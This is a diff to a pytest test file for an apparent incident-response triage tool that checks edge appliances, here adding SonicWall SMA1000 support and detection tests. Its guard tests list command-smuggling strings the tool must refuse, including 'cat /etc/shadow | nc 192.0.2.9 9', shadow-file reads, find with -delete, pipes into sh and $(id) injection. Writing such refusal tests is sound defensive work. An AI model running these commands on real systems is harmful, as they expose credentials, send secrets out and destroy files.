@@ -550,7 +550,8 @@ def test_every_implant_without_coverage_states_a_gap():
 # ------------------------------------------------------------------ new platforms (2026-10-22)
 IOSXE_PKG = "bootflash:isr4400-mono-universalk9.17.09.04a.SPA.pkg"
 NEW_PLATFORMS = [("junos", "junos", {}), ("cisco-iosxe", "iosxe", {"boot_image": IOSXE_PKG}),
-                 ("f5-bigip", "f5", {}), ("checkpoint-gaia", "checkpoint", {})]
+                 ("f5-bigip", "f5", {}), ("checkpoint-gaia", "checkpoint", {}),
+                 ("sonicwall-sma1000", "sma1000", {})]
 
 
 @pytest.mark.parametrize("profile,fixture,var", NEW_PLATFORMS)
@@ -566,6 +567,7 @@ def test_new_platform_benign_is_not_called_clean(fx, tmp_path, profile, fixture,
     ("cisco-iosxe", "iosxe", {"boot_image": IOSXE_PKG}, "COMPROMISED"),
     ("f5-bigip", "f5", {}, "COMPROMISED"),
     ("checkpoint-gaia", "checkpoint", {}, "LIKELY-COMPROMISED"),
+    ("sonicwall-sma1000", "sma1000", {}, "COMPROMISED"),
 ])
 def test_new_platform_compromised_verdict(fx, tmp_path, profile, fixture, var, expected):
     root = run(fx, tmp_path, profile, f"{fixture}-compromised", variables=var)
@@ -732,6 +734,11 @@ def test_new_bash_guards_refuse_smuggling():
                      "ls -la /tmp | sh", "cat /etc/shadow | nc 192.0.2.9 9", "ls -la ${IFS}",
                      "find /usr -type f -name 'x' -delete", "tmsh run util bash | cat"],
         "checkpoint-gaia": ["fw ver; reboot", "ls -l /tmp | sh", "ls -1d $(id)", "clish -c 'set user x'"],
+        # A full root shell: every allowed command is fixed, so any other path or flag is refused.
+        "sonicwall-sma1000": ["cat /etc/shadow", "find / -perm -4000 -delete", "find / -perm -4000 -exec rm {} +",
+                              "find / -perm -4000 -fprint /tmp/x", "ls -la /tmp; reboot", "ls -la /tmp /var/tmp /etc",
+                              "cat /var/lib/unit/conf.json | sh", "cat /proc/net/tcp > /tmp/x", "ls -la $(id)",
+                              "date -u\nreboot", "tcpdump -i any", "ls -l /proc/*/fd ${IFS}", "ls -la /tmp/../etc"],
         "junos": ["show version | no-more | save /var/tmp/x", "request system malware-scan quick-scan",
                   "show version\nrequest system reboot", "file delete /var/log/messages"],
         "cisco-iosxe": ["show running-config | redirect bootflash:x", "show clock\nreload",
@@ -993,6 +1000,41 @@ def test_sma1000_published_indicators_fire_and_ordinary_lines_do_not(fx, tmp_pat
     for did in SMA1000_FIRES:
         assert det(good, did)["status"] == "no-hit", did
     assert good["verdict"]["level"] == "NO-INDICATORS-FOUND"
+
+
+SMA1000_REPLAY_FIRES = {   # detection -> hits when the profile replays the compromised appliance
+    "sma1000-unit-api-routes": 2, "sma1000-workplace-init-knuckleball": 1, "sma1000-rootrun-path": 1,
+    "sma1000-uta0533-tmp-files": 2,                       # hypdate.b64 and 1234.sh were present and fetched
+    "sma1000-uta0533-files-listed": 7,                    # 4 in the /tmp listing, 3 in the fetch step's ls
+    "sma1000-knuckleball-listed": 2, "sma1000-couchdb-owned-tmp-file": 2, "sma1000-tcpdump-writing-to-tmp": 1,
+    "sma1000-deleted-jar-held-open": 1, "sma1000-setuid-outside-expected": 1,
+}
+
+
+def test_sma1000_profile_replay_reads_its_own_steps(fx, tmp_path):
+    """The profile's listings feed the pack: ls's "No such file" lines for the same names never
+    fire, Volexity's eleven expected setuid binaries never fire, and only xzfind does."""
+    bad = analyze(run(fx, tmp_path, "sonicwall-sma1000", "sma1000-compromised"))
+    for did, n in SMA1000_REPLAY_FIRES.items():
+        assert det(bad, did)["hit_count"] == n, did
+    assert [h["extra"]["path"] for h in det(bad, "sma1000-setuid-outside-expected")["hits"]] == ["/usr/bin/xzfind"]
+    good = analyze(run(fx, tmp_path, "sonicwall-sma1000", "sma1000-benign", case_id="IR-SMAB"))
+    assert det(good, "sma1000-uta0533-files-listed")["status"] == "no-hit"     # seven "cannot access" lines
+    assert det(good, "sma1000-setuid-outside-expected")["status"] == "no-hit"
+    assert det(good, "sma1000-rootrun-path")["status"] == "not-evaluated"      # nothing fetched, nothing passed
+
+
+def test_sma1000_setuid_check_says_not_evaluated_when_find_failed(fx, tmp_path):
+    """A listing with no path in it - find missing or refused - is not evaluated, never a pass."""
+    import shutil
+    from edgetriage.util import slugify
+    rp = tmp_path / "replay"
+    shutil.copytree(fx / "sma1000-compromised", rp)
+    (rp / "commands" / f"{slugify('find / -perm -4000')}.txt").write_text("sh: find: command not found\n")
+    case = Case(tmp_path / "IR-NOFIND")
+    collect(get_profile("sonicwall-sma1000"), ReplayTransport(rp), case, case_id="IR-NOFIND", operator="t",
+            target={"host": "192.0.2.10"}, preflight={}, variables={})
+    assert det(analyze(case.root), "sma1000-setuid-outside-expected")["status"] == "not-evaluated"
 
 
 def test_sma1000_patterns_take_the_published_shapes():
